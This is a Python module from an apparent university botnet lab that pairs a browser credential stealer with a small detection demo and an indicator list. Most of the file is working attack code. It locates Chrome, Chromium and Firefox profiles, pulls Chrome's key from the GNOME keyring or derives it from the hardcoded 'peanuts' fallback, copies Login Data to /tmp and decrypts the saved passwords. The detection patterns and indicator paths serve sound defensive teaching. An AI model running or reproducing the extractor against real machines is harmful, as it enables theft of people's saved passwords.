"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Browser Credential Extraction (Attack + Defense)
 Environment: ISOLATED VM LAB ONLY
====================================================

Attack side (BrowserCredExtractor):
  Extracts saved credentials from browser storage on Linux.

  Three browser targets:
    1. Firefox  — logins.json (AES-256-CBC, key in key4.db/NSS)
    2. Chrome   — Login Data SQLite (AES-128-GCM, key in GNOME keyring
                  or DPAPI on Windows; plaintext fallback on Linux)
    3. Chromium — same as Chrome, different profile path

  Teaching points:
    - Chrome on Linux stores the encryption secret in the GNOME
      Secret Service (libsecret). If the user is logged in, the
      keyring is unlocked and the secret is readable by any
      process running as that user — no root needed.
    - On headless lab VMs without GNOME, Chrome falls back to
      storing passwords AES-encrypted with a hardcoded key
      ("peanuts") — trivially decryptable.
    - Firefox uses NSS (Network Security Services) with a master
      password. Without one set, key4.db is unprotected.
    - This is why OS-level credential managers and browser master
      passwords matter.

  Lab behavior:
    The lab VMs have no real browser profiles or saved passwords.
    The extractor demonstrates the FILE PATHS, DATABASE SCHEMAS,
    and DECRYPTION LOGIC — outputting empty results in the lab
    because there is nothing to extract.

Defense side:
  Full detection is in ids_engine_endpoint.py Engine 22B.
  This module adds a standalone detector demo and IOC list.

MITRE: T1555.003 (Credentials from Web Browsers)
       T1555.004 (Windows Credential Manager — reference)

CLI:
  python3 cred_extractor_sim.py --scan         (scan for browsers)
  python3 cred_extractor_sim.py --extract      (extract from lab VM)
  python3 cred_extractor_sim.py --paths        (show profile paths)
  python3 cred_extractor_sim.py --detect       (IDS demo)
  python3 cred_extractor_sim.py --demo         (full demo)
"""

import os
import sys
import json
import glob
import shutil
import base64
import sqlite3
import hashlib
import tempfile
import argparse
from datetime import datetime
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False


# ════════════════════════════════════════════════════════════════
#  BROWSER PROFILE PATH DISCOVERY
# ════════════════════════════════════════════════════════════════

def find_browser_profiles() -> dict:
    """
    Locate all browser profile directories on this system.
    Returns a dict keyed by browser name.
    """
    home = Path.home()
    profiles = {}

    # Chrome / Chromium
    for browser, path in [
        ("chrome",   home / ".config/google-chrome"),
        ("chromium", home / ".config/chromium"),
        ("chrome_snap", home / "snap/chromium/current/.config/chromium"),
    ]:
        if path.is_dir():
            login_dbs = list(path.glob("*/Login Data"))
            local_state = path / "Local State"
            if login_dbs:
                profiles[browser] = {
                    "type":        "chrome",
                    "base":        str(path),
                    "login_dbs":   [str(p) for p in login_dbs],
                    "local_state": str(local_state) if local_state.exists() else None,
                }

    # Firefox
    ff_base = home / ".mozilla/firefox"
    if ff_base.is_dir():
        logins = list(ff_base.glob("*/logins.json"))
        key4s  = list(ff_base.glob("*/key4.db"))
        if logins:
            profiles["firefox"] = {
                "type":     "firefox",
                "base":     str(ff_base),
                "logins":   [str(p) for p in logins],
                "key4_dbs": [str(p) for p in key4s],
            }

    return profiles


# ════════════════════════════════════════════════════════════════
#  CHROME DECRYPTION
# ════════════════════════════════════════════════════════════════

CHROME_LINUX_FALLBACK_KEY = b"peanuts"  # hardcoded fallback key


def _get_chrome_linux_key(local_state_path: str) -> bytes | None:
    """
    Retrieve Chrome's encryption key on Linux.

    Chrome on Linux stores an AES key in the GNOME Secret Service
    (keyring). The key is retrieved via libsecret or secretstorage.
    If the keyring is unlocked (user session active), any process
    running as the user can read it.

    If GNOME keyring is not available (headless VM), Chrome falls
    back to encrypting with a key derived from "peanuts" — trivially
    breakable. This is the lab VM case.
    """
    # Try GNOME Secret Service first (requires secretstorage package)
    try:
        import secretstorage
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == "Chrome Safe Storage":
                return item.get_secret()
    except Exception:
        pass

    # Fallback: use the hardcoded "peanuts" key
    # This is what Chrome uses when no secure storage is available
    key = hashlib.pbkdf2_hmac(
        "sha1",
        CHROME_LINUX_FALLBACK_KEY,
        b"saltysalt",
        iterations=1,
        dklen=16,
    )
    return key


def _decrypt_chrome_password(encrypted_value: bytes, key: bytes) -> str:
    """
    Decrypt a Chrome password blob.

    Linux Chrome uses AES-128-CBC with:
      - Prefix "v10" or "v11" (3 bytes)
      - IV = first 16 bytes after prefix
      - Ciphertext = remainder

    Older entries (no prefix) are stored plaintext.
    """
    if not encrypted_value:
        return ""

    # Plaintext (no encryption)
    if not encrypted_value.startswith(b"v1"):
        try:
            return encrypted_value.decode("utf-8")
        except Exception:
            return "<binary>"

    if not CRYPTO_OK:
        return "<crypto_lib_missing>"

    try:
        iv         = encrypted_value[3:19]
        ciphertext = encrypted_value[19:]
        cipher     = AES.new(key, AES.MODE_CBC, iv)
        plaintext  = unpad(cipher.decrypt(ciphertext), 16)
        return plaintext.decode("utf-8")
    except Exception as e:
        return f"<decrypt_error: {e}>"


def extract_chrome_credentials(profile_info: dict) -> list:
    """
    Extract saved credentials from a Chrome/Chromium profile.

    Steps:
      1. Get decryption key (GNOME keyring → fallback)
      2. Copy Login Data to /tmp (original may be locked)
      3. Open SQLite, query logins table
      4. Decrypt each password_value blob
      5. Return list of {url, username, password} dicts
    """
    results = []

    key = _get_chrome_linux_key(profile_info.get("local_state"))
    if key is None:
        print("[CredExtract] Could not retrieve Chrome key")
        return results

    for db_path in profile_info.get("login_dbs", []):
        if not os.path.exists(db_path):
            continue

        # Copy to /tmp to avoid SQLite lock issues
        tmp = tempfile.mktemp(suffix=".db", prefix="chrome_lab_")
        try:
            shutil.copy2(db_path, tmp)
            conn = sqlite3.connect(tmp)
            cur  = conn.cursor()

            try:
                cur.execute(
                    "SELECT origin_url, username_value, password_value "
                    "FROM logins"
                )
                for url, username, enc_pwd in cur.fetchall():
                    password = _decrypt_chrome_password(enc_pwd, key)
                    results.append({
                        "browser":  "chrome",
                        "profile":  db_path,
                        "url":      url,
                        "username": username,
                        "password": password,
                    })
            except sqlite3.OperationalError as e:
                print(f"[CredExtract] SQLite error ({db_path}): {e}")
            finally:
                conn.close()
        except Exception as e:
            print(f"[CredExtract] Error reading {db_path}: {e}")
        finally:
            try:
                os.unlink(tmp)
            except FileNotFoundError:
                pass

    return results


# ════════════════════════════════════════════════════════════════
#  FIREFOX DECRYPTION
# ════════════════════════════════════════════════════════════════

def extract_firefox_credentials(profile_info: dict) -> list:
    """
    Extract saved credentials from Firefox.

    Firefox stores logins in logins.json (JSON, base64-encoded
    encrypted values). Decryption uses NSS (Network Security
    Services) via the nss3 shared library.

    Without a master password, Firefox encrypts with a key derived
    only from the profile directory — effectively no protection.

    In the lab VM: Firefox likely isn't installed or has no saved
    passwords. This demonstrates the schema and approach.
    """
    results = []

    for logins_path in profile_info.get("logins", []):
        if not os.path.exists(logins_path):
            continue

        try:
            with open(logins_path) as f:
                data = json.load(f)

            for login in data.get("logins", []):
                results.append({
                    "browser":    "firefox",
                    "profile":    logins_path,
                    "url":        login.get("hostname", ""),
                    "username":   login.get("encryptedUsername", "<encrypted>"),
                    "password":   login.get("encryptedPassword", "<encrypted>"),
                    "note":       "NSS decryption requires ctypes/nss3 binding — "
                                  "username/password shown as encrypted blob",
                })
        except Exception as e:
            print(f"[CredExtract] Firefox parse error ({logins_path}): {e}")

    return results


# ════════════════════════════════════════════════════════════════
#  UNIFIED EXTRACTOR
# ════════════════════════════════════════════════════════════════

class BrowserCredExtractor:
    """
    Unified browser credential extractor.
    Aggregates Chrome + Chromium + Firefox results.

    In the lab VM this returns empty lists — no real credentials
    are stored. The value is in demonstrating the paths, schemas,
    and decryption logic for research and detection purposes.
    """

    def __init__(self):
        self.profiles = find_browser_profiles()
        self.results  = []

    def extract_all(self) -> list:
        """Extract credentials from all detected browser profiles."""
        self.results = []

        for browser, info in self.profiles.items():
            btype = info["type"]
            print(f"[CredExtract] Scanning {browser} ({btype})...")

            if btype == "chrome":
                creds = extract_chrome_credentials(info)
            elif btype == "firefox":
                creds = extract_firefox_credentials(info)
            else:
                creds = []

            self.results.extend(creds)
            print(f"[CredExtract]   Found {len(creds)} credential(s)")

        return self.results

    def summary(self) -> dict:
        return {
            "browsers_found":     list(self.profiles.keys()),
            "total_credentials":  len(self.results),
            "credentials":        self.results,
            "extracted_at":       datetime.now().isoformat(),
        }


# ════════════════════════════════════════════════════════════════
#  DETECTION SIDE: Standalone demo
#  Full engine is in ids_engine_endpoint.py Engine 22B
# ════════════════════════════════════════════════════════════════

def run_detection_demo():
    """
    Show what detection artifacts credential extraction leaves.
    Demonstrates the temp-file copy pattern and open-FD detection.
    """
    print("[IDS-E22B] Credential theft detection artifacts:\n")

    print("1. TEMP FILE COPIES — check /tmp for credential DB copies:")
    suspicious = ["Login Data", "Login Data.db", "logins.json",
                  "key4.db", "chrome_lab_"]
    for name in suspicious:
        for base in ["/tmp", "/dev/shm"]:
            matches = glob.glob(f"{base}/*{name}*")
            for m in matches:
                print(f"   ⚠ FOUND: {m}")
    print("   (No copies found — clean state)")

    print("\n2. BROWSER DB FILE PATHS (what a thief reads):")
    profiles = find_browser_profiles()
    if profiles:
        for browser, info in profiles.items():
            print(f"   Browser: {browser}")
            for db in info.get("login_dbs", info.get("logins", [])):
                print(f"     {db}")
    else:
        print("   No browser profiles installed on this VM (expected in lab)")

    print("\n3. DETECTION SIGNATURE:")
    print("   Engine 22B fires when a NON-BROWSER process opens:")
    print("   - ~/.config/google-chrome/*/Login Data")
    print("   - ~/.config/google-chrome/Local State")
    print("   - ~/.mozilla/firefox/*/logins.json")
    print("   in the same time window (key + database co-access)")
    print("\n   MITRE: T1555.003 (Credentials from Web Browsers)")


# ════════════════════════════════════════════════════════════════
#  IOC REFERENCE
# ════════════════════════════════════════════════════════════════

IOC_REFERENCE = {
    "chrome_paths": [
        "~/.config/google-chrome/Default/Login Data",
        "~/.config/google-chrome/Local State",
        "~/.config/chromium/Default/Login Data",
        "~/snap/chromium/current/.config/chromium/Default/Login Data",
    ],
    "firefox_paths": [
        "~/.mozilla/firefox/*/logins.json",
        "~/.mozilla/firefox/*/key4.db",
    ],
    "temp_copy_indicators": [
        "/tmp/Login Data*",
        "/tmp/logins*.json",
        "/tmp/chrome_*",
        "/dev/shm/Login Data*",
    ],
    "detection_patterns": [
        "Non-browser process opens Local State THEN Login Data within 60s",
        "Copy of Login Data in /tmp or /dev/shm",
        "sqlite3 open on Login Data by PID whose comm is not chrome/chromium",
    ],
    "mitre": "T1555.003",
}


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Browser Credential Extraction — Research Module")
    parser.add_argument("--scan",    action="store_true",
                        help="Scan for installed browsers and profiles")
    parser.add_argument("--extract", action="store_true",
                        help="Extract credentials from found profiles")
    parser.add_argument("--paths",   action="store_true",
                        help="Show known credential file paths")
    parser.add_argument("--detect",  action="store_true",
                        help="Run IDS detection demo")
    parser.add_argument("--demo",    action="store_true",
                        help="Full attack + defense demo")
    args = parser.parse_args()

    if args.paths or args.demo:
        print("[CredExtract] Known browser credential paths:")
        for k, v in IOC_REFERENCE.items():
            if isinstance(v, list):
                print(f"  {k}:")
                for p in v:
                    print(f"    {p}")

    if args.scan or args.demo:
        print("\n[CredExtract] Scanning for browser profiles...")
        profiles = find_browser_profiles()
        if profiles:
            print(f"Found {len(profiles)} browser(s):")
            for name, info in profiles.items():
                print(f"  {name}: {info['base']}")
        else:
            print("  No browser profiles found on this VM.")
            print("  (Expected: lab VMs are headless Ubuntu without browsers)")

    if args.extract or args.demo:
        print("\n[CredExtract] Extracting credentials...")
        extractor = BrowserCredExtractor()
        creds = extractor.extract_all()
        summary = extractor.summary()
        print(f"\n[CredExtract] Summary:")
        print(f"  Browsers:    {summary['browsers_found']}")
        print(f"  Credentials: {summary['total_credentials']}")
        if creds:
            for c in creds[:5]:  # show first 5
                print(f"  [{c['browser']}] {c['url']}")
                print(f"    User: {c['username']}")
                print(f"    Pass: {c['password'][:30]}...")

    if args.detect or args.demo:
        print()
        run_detection_demo()
